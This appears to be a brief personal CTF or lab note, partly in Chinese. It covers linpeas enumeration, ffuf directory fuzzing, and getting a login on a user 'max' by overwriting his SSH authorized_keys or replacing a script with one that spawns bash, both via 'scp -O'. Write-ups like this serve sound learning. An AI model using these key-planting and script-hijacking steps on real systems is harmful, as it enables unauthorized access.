read carefully LINPEAS RESULT .

HOW to use scp and scp -O
HOW TO WRITE SCP CMD
HOW TO USE SSH
HOW TO USE FFUF WITH BIGEST DICTIONARY WITH different ports.



```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$ip/FUZZ
```

ffuf can run different port 



two way, 

change the auth key , then use the scp replace the key in max, so ssh can login. 

or edit the sh file as below,just give bash, use scp replace the sh file in max, then ssh login. 

```
#!/bin/bash

/bin/bash
```

scp -O

- `scp -O` ：强制使用传统 SCP 协议传输，避免 SFTP 协议相关错误。
- 适用于远程服务器不支持 SFTP 或环境复杂导致 SFTP 失败的场景。
- 这是 OpenSSH 新版本中针对兼容性问题的一个解决方案。

so, -O means old. - **SFTP** is a network protocol that provides secure file transfer over SSH.

```
scp -O -i .ssh/id_rsa .ssh/authorized_keys max@$IP:/home/max/.ssh/authorized_keys
```



